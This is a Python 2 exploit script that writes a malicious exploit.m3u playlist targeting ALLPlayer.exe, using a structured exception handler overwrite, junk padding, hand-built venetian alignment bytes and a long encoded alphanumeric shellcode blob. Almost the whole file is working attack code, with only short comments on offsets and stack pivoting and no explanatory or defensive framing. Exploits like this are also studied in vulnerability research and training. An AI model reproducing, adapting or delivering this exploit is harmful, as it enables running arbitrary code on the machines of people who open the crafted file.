#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import codecs

def c(x):
  return pack('<L', x)

def pc(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def junk(size):
    return "\x62"*size

#EXITFUNC = process/thread to keep ALLPlayer.exe running after exploit
shellcode = ("\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
"\x49\x41\x6a\x58\x41\x51\x41\x44\x41\x5a\x41\x42\x41\x52\x41"
"\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49"
"\x41\x49\x41\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49"
"\x41\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41\x5a"
"\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
"\x75\x34\x4a\x42\x79\x6c\x4a\x48\x42\x62\x79\x70\x4b\x50\x6d"
"\x30\x63\x30\x35\x39\x5a\x45\x4e\x51\x69\x30\x30\x64\x42\x6b"
"\x62\x30\x4c\x70\x34\x4b\x50\x52\x4c\x4c\x42\x6b\x72\x32\x4c"
"\x54\x44\x4b\x61\x62\x4d\x58\x7a\x6f\x46\x57\x70\x4a\x6c\x66"
"\x4c\x71\x49\x6f\x34\x6c\x4d\x6c\x53\x31\x51\x6c\x49\x72\x6e"
"\x4c\x6f\x30\x35\x71\x66\x6f\x6c\x4d\x69\x71\x75\x77\x47\x72"
"\x58\x72\x6e\x72\x6e\x77\x62\x6b\x51\x42\x4c\x50\x72\x6b\x6e"
"\x6a\x6f\x4c\x64\x4b\x70\x4c\x6c\x51\x73\x48\x39\x53\x31\x38"
"\x7a\x61\x46\x71\x70\x51\x62\x6b\x71\x49\x4b\x70\x6a\x61\x39"
"\x43\x32\x6b\x30\x49\x4c\x58\x69\x53\x4d\x6a\x70\x49\x62\x6b"
"\x6f\x44\x32\x6b\x39\x71\x37\x66\x70\x31\x69\x6f\x56\x4c\x37"
"\x51\x56\x6f\x7a\x6d\x4a\x61\x77\x57\x4d\x68\x6b\x30\x70\x75"
"\x5a\x56\x6b\x53\x33\x4d\x5a\x58\x6d\x6b\x73\x4d\x4e\x44\x30"
"\x75\x5a\x44\x70\x58\x44\x4b\x30\x58\x6e\x44\x6d\x31\x59\x43"
"\x50\x66\x32\x6b\x5a\x6c\x4e\x6b\x44\x4b\x4f\x68\x6d\x4c\x4d"
"\x31\x47\x63\x44\x4b\x49\x74\x42\x6b\x7a\x61\x78\x50\x32\x69"
"\x51\x34\x4c\x64\x6b\x74\x4f\x6b\x51\x4b\x71\x51\x6e\x79\x50"
"\x5a\x6f\x61\x49\x6f\x79\x50\x61\x4f\x6f\x6f\x4e\x7a\x64\x4b"
"\x6e\x32\x4a\x4b\x32\x6d\x71\x4d\x52\x4a\x4a\x61\x42\x6d\x33"
"\x55\x57\x42\x4d\x30\x6b\x50\x39\x70\x4e\x70\x33\x38\x4e\x51"
"\x64\x4b\x70\x6f\x65\x37\x6b\x4f\x37\x65\x35\x6b\x79\x50\x4d"
"\x4d\x6e\x4a\x6b\x5a\x63\x38\x47\x36\x54\x55\x67\x4d\x33\x6d"
"\x49\x6f\x5a\x35\x6d\x6c\x6b\x56\x61\x6c\x4a\x6a\x61\x70\x49"
"\x6b\x39\x50\x34\x35\x6d\x35\x77\x4b\x30\x47\x6d\x43\x31\x62"
"\x62\x4f\x61\x5a\x39\x70\x62\x33\x49\x6f\x7a\x35\x53\x33\x30"
"\x61\x30\x6c\x73\x33\x4c\x6e\x6f\x75\x63\x48\x51\x55\x6d\x30"
"\x41\x41")

exploit = ""
buffsize = 5000
SEH = 303
#exploit pattern on stack +14H(20 bytes) & +2C(44 bytes)
#Find unicode PPR
# add "BB" for NSEH, look @ stack
# stackpivot 1652----2052
exploit += junk(303)
exploit += "\x61\x6d" #POPAD maybe jump over blocker at 0012ED34 #works, gets us to 0012ED37 then generate venetian shellcode with mona
exploit += "\xDF\x59" #becomes 0x005900df
# exploit += '\xbb\x56\x41m\xb8\x55\x41\xe3m\xb9\x4b\x41m\xb8\x6d\x41\xe1m\xba\x79\x41m\xb8\x63\x41\xe2mUmX\xdc\xec\xd4\xe8\xc8\xc8\xf0\xf0\xd0\xd0m'
#null byte was leaked to venetian shellcode, so adding nullbyte
exploit += 'm\xbb\x56\x41m\xb8\x55\x41\xe3m\xb9\x4b\x41m\xb8\x6d\x41\xe1m\xba\x79\x41m\xb8\x63\x41\xe2mUmX\xdc\xec\xd4\xf8\xd8\xe8\xc8\xf0m' 
exploit += shellcode
exploit += junk(buffsize-len(exploit))




buffer = "http://"
buffer += exploit
print "[+] Creating malicious file"
print "[+] exploit.m3u"


file = open("/Users/omaidfaizyar/Desktop/VM/exploit.m3u","w")
file.write(buffer)
file.close()